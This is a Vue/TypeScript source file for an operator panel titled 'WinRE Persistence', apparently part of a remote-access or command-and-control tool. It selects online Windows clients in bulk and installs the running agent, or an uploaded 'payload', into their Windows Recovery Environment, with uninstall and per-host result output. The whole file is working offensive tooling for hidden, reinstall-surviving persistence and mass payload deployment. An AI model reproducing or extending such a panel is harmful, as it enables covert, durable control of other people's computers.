<script setup lang="ts">
import { ref, computed, onMounted } from 'vue'
import { api } from '../lib/api'

interface Client {
  id: string; host: string; nickname?: string; user: string; os: string; online: boolean
}
interface WinREResult {
  clientId: string; ok: boolean; reason?: string; error?: string
}

const clients = ref<Client[]>([])
const selectedClients = ref<string[]>([])
const loading = ref(true)
const searchQuery = ref('')
const activeTab = ref<'self' | 'upload'>('self')
const outputLines = ref<{ host: string; ok: boolean; detail: string }[]>([])

const selectedFile = ref<File | null>(null)
const fileInput = ref<HTMLInputElement | null>(null)
const uploading = ref(false)
const uploadResult = ref<{ uploadId: string; name: string; size: number } | null>(null)
const dragOver = ref(false)

const processing = ref(false)
const error = ref('')
const success = ref('')

const winOnlyClients = computed(() => {
  return clients.value.filter(c => {
    const isWindows = c.os.toLowerCase().includes('windows')
    if (!isWindows) return false
    if (searchQuery.value) {
      const q = searchQuery.value.toLowerCase()
      return c.host.toLowerCase().includes(q) || c.id.toLowerCase().includes(q) || (c.nickname || '').toLowerCase().includes(q)
    }
    return true
  })
})

async function loadClients() {
  loading.value = true
  try {
    const data = await api.get<{ items: Client[] }>('/api/clients?pageSize=10000')
    clients.value = (data.items || []).filter((c: any) => c.online)
  } catch {} finally { loading.value = false }
}

function toggleClient(id: string) {
  const idx = selectedClients.value.indexOf(id)
  if (idx >= 0) selectedClients.value.splice(idx, 1); else selectedClients.value.push(id)
}
function selectAll() {
  const ids = winOnlyClients.value.map(c => c.id)
  if (selectedClients.value.length === ids.length) selectedClients.value = []; else selectedClients.value = [...ids]
}

function onFileSelect(e: Event) {
  const input = e.target as HTMLInputElement
  if (input.files?.length) selectedFile.value = input.files[0]
}
function onDragOver(e: DragEvent) { e.preventDefault(); dragOver.value = true }
function onDragLeave() { dragOver.value = false }
function onDrop(e: DragEvent) {
  e.preventDefault(); dragOver.value = false
  if (e.dataTransfer?.files?.length) selectedFile.value = e.dataTransfer.files[0]
}

async function uploadPayload() {
  if (!selectedFile.value) return
  uploading.value = true; error.value = ''
  try {
    const formData = new FormData()
    formData.append('file', selectedFile.value)
    const resp = await fetch('/api/winre/upload', { method: 'POST', credentials: 'include', body: formData })
    const data = await resp.json()
    if (!data.ok) throw new Error(data.error || 'Upload failed')
    uploadResult.value = data
  } catch (e: any) { error.value = e.message || 'Upload failed' }
  finally { uploading.value = false }
}

async function installSelf() {
  if (selectedClients.value.length === 0) return
  processing.value = true; error.value = ''; outputLines.value = []
  try {
    const data = await api.post<{ results: WinREResult[] }>('/api/winre/install-self', { clientIds: selectedClients.value })
    for (const r of data.results || []) {
      const c = clients.value.find(x => x.id === r.clientId)
      outputLines.value.push({ host: c?.nickname || c?.host || r.clientId, ok: r.ok, detail: r.reason || r.error || 'OK' })
    }
  } catch (e: any) { error.value = e.message || 'Install failed' }
  finally { processing.value = false }
}

async function installFile() {
  if (!uploadResult.value || selectedClients.value.length === 0) return
  processing.value = true; error.value = ''; outputLines.value = []
  try {
    const data = await api.post<{ results: WinREResult[] }>('/api/winre/install', {
      uploadId: uploadResult.value.uploadId,
      clientIds: selectedClients.value
    })
    for (const r of data.results || []) {
      const c = clients.value.find(x => x.id === r.clientId)
      outputLines.value.push({ host: c?.nickname || c?.host || r.clientId, ok: r.ok, detail: r.reason || r.error || 'OK' })
    }
  } catch (e: any) { error.value = e.message || 'Install failed' }
  finally { processing.value = false }
}

async function uninstall() {
  if (selectedClients.value.length === 0) return
  if (!confirm(`Uninstall WinRE from ${selectedClients.value.length} client(s)?`)) return
  processing.value = true; error.value = ''; outputLines.value = []
  try {
    const data = await api.post<{ results: WinREResult[] }>('/api/winre/uninstall', { clientIds: selectedClients.value })
    for (const r of data.results || []) {
      const c = clients.value.find(x => x.id === r.clientId)
      outputLines.value.push({ host: c?.nickname || c?.host || r.clientId, ok: r.ok, detail: r.reason || r.error || 'OK' })
    }
  } catch (e: any) { error.value = e.message || 'Uninstall failed' }
  finally { processing.value = false }
}

onMounted(loadClients)
</script>

<template>
  <div>
    <div class="section-header">
      <h1 class="section-title"><i class="fa-solid fa-shield-halved" style="margin-right:8px;color:#fbbf24"></i>WinRE Persistence</h1>
      <span class="badge badge-sm">{{ winOnlyClients.length }} Windows clients</span>
    </div>

    <div v-if="error" class="alert alert-error" style="margin-bottom:16px"><i class="fa-solid fa-circle-exclamation"></i>{{ error }}</div>

    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
      <div style="display:flex;flex-direction:column;gap:16px">
        <div class="panel" style="display:flex;gap:2px;padding:4px">
          <button v-for="tab in (['self','upload'] as const)" :key="tab" @click="activeTab = tab" :style="{flex:1,padding:'8px',borderRadius:'8px',border:'none',cursor:'pointer',fontSize:'13px',fontWeight:500,transition:'all 150ms',background: activeTab===tab ? 'rgba(99,102,241,0.18)' : 'transparent', color: activeTab===tab ? '#c7d2fe' : '#94a3b8'}">
            {{ tab === 'self' ? 'Install Self' : 'Upload File' }}
          </button>
        </div>

        <div class="panel" v-if="activeTab === 'self'">
          <h2 style="font-size:13px;font-weight:600;color:#cbd5e1;margin-bottom:6px">Install Agent as WinRE</h2>
          <p style="font-size:12px;color:#64748b;margin:0 0 14px">Installs the currently running agent binary into Windows Recovery Environment.</p>
          <button @click="installSelf" :disabled="selectedClients.length===0||processing" class="btn btn-success btn-sm" style="width:100%">
            <i v-if="processing" class="fa-solid fa-spinner fa-spin"></i><i v-else class="fa-solid fa-shield-halved"></i>
            Install Self on {{ selectedClients.length }} client(s)
          </button>
        </div>

        <div class="panel" v-if="activeTab === 'upload'">
          <h2 style="font-size:13px;font-weight:600;color:#cbd5e1;margin-bottom:10px">Upload Payload</h2>
          <div @dragover="onDragOver" @dragleave="onDragLeave" @drop="onDrop" @click="fileInput?.click()" :style="{border:'2px dashed '+(dragOver?'#6366f1':'rgba(148,163,184,0.2)'),borderRadius:'10px',padding:'20px',textAlign:'center',cursor:'pointer',transition:'all 150ms'}">
            <input ref="fileInput" type="file" class="hidden" @change="onFileSelect" />
            <template v-if="selectedFile">
              <div style="font-size:13px;color:#e2e8f0">{{ selectedFile.name }}</div>
              <div style="font-size:11px;color:#64748b;margin-top:4px">{{ (selectedFile.size / 1024).toFixed(1) }} KB</div>
            </template>
            <template v-else>
              <i class="fa-solid fa-cloud-arrow-up" style="font-size:20px;color:#64748b;display:block;margin-bottom:6px"></i>
              <div style="font-size:12px;color:#94a3b8">Drop payload or click</div>
            </template>
          </div>
          <button v-if="selectedFile && !uploadResult" @click="uploadPayload" :disabled="uploading" class="btn btn-primary btn-sm" style="width:100%;margin-top:10px">
            <i v-if="uploading" class="fa-solid fa-spinner fa-spin"></i>Upload
          </button>
          <div v-if="uploadResult" style="margin-top:10px;padding:8px;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:8px;font-size:12px;color:#86efac">
            <i class="fa-solid fa-check" style="margin-right:6px"></i>{{ uploadResult.name }}
          </div>
          <button v-if="uploadResult" @click="installFile" :disabled="selectedClients.length===0||processing" class="btn btn-success btn-sm" style="width:100%;margin-top:10px">
            <i v-if="processing" class="fa-solid fa-spinner fa-spin"></i><i v-else class="fa-solid fa-shield-halved"></i>
            Install on {{ selectedClients.length }} client(s)
          </button>
        </div>

        <button @click="uninstall" :disabled="selectedClients.length===0||processing" class="btn btn-danger btn-sm" style="width:100%">
          <i v-if="processing" class="fa-solid fa-spinner fa-spin"></i><i v-else class="fa-solid fa-trash"></i>
          Uninstall from {{ selectedClients.length }} client(s)
        </button>
      </div>

      <div class="panel" style="display:flex;flex-direction:column;max-height:calc(100vh - 200px)">
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
          <input v-model="searchQuery" placeholder="Search Windows clients..." class="input" style="flex:1;padding:7px 10px;font-size:12px" />
          <button @click="selectAll" class="btn btn-ghost" style="padding:4px 8px;font-size:11px">{{ selectedClients.length === winOnlyClients.length ? 'Deselect' : 'Select All' }}</button>
          <span style="font-size:11px;color:#64748b;white-space:nowrap">{{ selectedClients.length }} sel</span>
          <button @click="loadClients" class="btn-icon-sm"><i class="fa-solid fa-rotate"></i></button>
        </div>
        <div style="flex:1;overflow-y:auto">
          <div v-if="loading" class="loading-state" style="padding:24px"><i class="fa-solid fa-spinner fa-spin"></i></div>
          <div v-else-if="winOnlyClients.length===0" class="empty-state" style="padding:24px">No online Windows clients</div>
          <label v-for="c in winOnlyClients" :key="c.id" style="display:flex;align-items:center;gap:8px;padding:7px 10px;border-bottom:1px solid var(--cv-border);cursor:pointer;font-size:13px">
            <input type="checkbox" :checked="selectedClients.includes(c.id)" @change="toggleClient(c.id)" style="accent-color:#6366f1" />
            <span class="status-dot status-dot-online" style="width:6px;height:6px"></span>
            <span style="color:#e2e8f0;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">{{ c.nickname || c.host }}</span>
          </label>
        </div>

        <div v-if="outputLines.length" style="margin-top:12px;border-top:1px solid var(--cv-border);padding-top:12px">
          <h3 style="font-size:12px;font-weight:600;color:#cbd5e1;margin-bottom:8px">Output</h3>
          <div style="max-height:200px;overflow-y:auto;font-family:ui-monospace,monospace;font-size:11px">
            <div v-for="(line, i) in outputLines" :key="i" style="display:flex;gap:8px;padding:4px 0;border-bottom:1px solid var(--cv-border)">
              <i :class="line.ok ? 'fa-solid fa-check-circle' : 'fa-solid fa-xmark-circle'" :style="{color: line.ok ? '#86efac' : '#fca5a5', fontSize:'11px', marginTop:'2px'}"></i>
              <div><span style="color:#e2e8f0;font-weight:500">{{ line.host }}</span> <span style="color:#64748b">{{ line.detail }}</span></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
